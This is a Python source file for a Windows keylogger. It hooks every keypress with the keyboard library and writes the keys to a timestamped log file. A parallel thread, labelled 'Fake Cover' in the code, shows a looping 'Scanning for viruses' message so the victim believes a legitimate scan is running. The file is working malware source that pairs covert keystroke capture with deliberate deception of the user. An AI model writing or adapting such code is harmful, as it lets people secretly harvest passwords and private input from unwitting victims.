import keyboard
import datetime
import os
import time
import threading
import wmi


# Initializing the wmi constructor
f = wmi.WMI()

# Writing the keylogs to a file
def on_key_press(event, file):
    file.write(event.name + '\n') # Write to the file
    file.flush()  # Flush the buffer to ensure immediate writing

# Fake Cover
def coverUp():
    while True:
        print("Scanning for viruses . ")
        print("Please do not turn off this program")
        time.sleep(1)
        os.system('cls')
        print("Scanning for viruses .. ")
        print("Please do not turn off this program")
        time.sleep(1)
        os.system('cls')
        print("Scanning for viruses ... ")
        print("Please do not turn off this program")
        time.sleep(1)
        os.system('cls')
        print("Scanning for viruses .... ")
        print("Please do not turn off this program")
        time.sleep(1)
        os.system('cls')

# Keylogging part
def actualTask():
    file_name = "Logs/"+datetime.datetime.now().strftime("%d-%m-%Y , %H.%M") + ".txt" # Name of the file
    with open(file_name, "w") as file:
        keyboard.on_press(lambda event: on_key_press(event, file)) # Detects the keys pressed upon pressing a key
        keyboard.wait() # Keeping the program running


# Main 
if __name__ == "__main__":
    # Multi threading 2 tasks simultaniously
    threadCover = threading.Thread(target=coverUp)
    threadReal = threading.Thread(target=actualTask)
    threadCover.start()
    threadReal.start()